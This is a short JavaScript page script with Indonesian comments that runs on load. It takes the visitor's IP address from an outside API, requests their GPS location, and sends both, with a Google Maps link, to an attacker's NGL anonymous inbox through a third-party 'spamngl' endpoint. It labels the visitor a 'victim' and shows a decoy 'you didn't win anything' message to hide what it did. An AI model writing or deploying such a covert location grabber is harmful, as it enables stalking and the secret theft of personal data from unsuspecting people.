async function autoKirim() {
  try {
    // Ambil IP dari API
    const res = await fetch('https://api.betabotz.eu.org/ip');
    const data = await res.json();
    const ip = data.ip;

    // Dapatkan lokasi pengguna
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(async (pos) => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const gmaps = `https://www.google.com/maps?q=${lat},${lon}`;

        // Gabungkan pesan IP dan MAP
        const pesan = `IP berhasil ditemukan:\nIP: ${ip}\nMAP: ${gmaps}`;
        const encodedPesan = encodeURIComponent(pesan);

        const nglUrl = `https://fastrestapis.fasturl.cloud/tool/spamngl?link=https://ngl.link/vinzz_official&message=${encodedPesan}&type=anonymous&count=1`;

        // Kirim pesan ke server
        const send = await fetch(nglUrl);
        if (send.ok) {
          document.body.innerHTML = '<h2>Yahh kurang hoki bro gk dapet wkwk<br><small>by Vinzz Official</small></h2>';
        } else {
          document.body.innerHTML = '<h2>Terjadi kesalahan saat mengirim request.</h2>';
        }
      }, async (err) => {
        let lokasiPesan;
        if (err.code === 1) {
          // Jika lokasi ditolak
          lokasiPesan = 'MAP: Akses ditolak oleh korban';
        } else {
          // Kesalahan lain saat mengambil lokasi
          lokasiPesan = 'MAP: Terjadi kesalahan saat mengambil lokasi.';
        }

        // Gabungkan pesan IP dan MAP meskipun lokasi ditolak
        const pesan = `IP berhasil ditemukan:\nIP: ${ip}\n${lokasiPesan}`;
        const encodedPesan = encodeURIComponent(pesan);

        const nglUrl = `https://fastrestapis.fasturl.cloud/tool/spamngl?link=https://ngl.link/vinzz_official&message=${encodedPesan}&type=anonymous&count=1`;

        // Kirim pesan ke server
        const send = await fetch(nglUrl);
        if (send.ok) {
          document.body.innerHTML = '<h2>Yahh kurang hoki bro gk dapet wkwk<br><small>by Vinzz Official</small></h2>';
        } else {
          document.body.innerHTML = '<h2>Terjadi kesalahan saat mengirim request.</h2>';
        }
      });
    } else {
      // Jika browser tidak mendukung geolokasi
      document.body.innerHTML = '<h2>Browser tidak mendukung geolokasi.</h2>';
    }
  } catch (err) {
    console.error(err);
    document.body.innerHTML = '<h2>Terjadi kesalahan.</h2>';
  }
}

autoKirim();
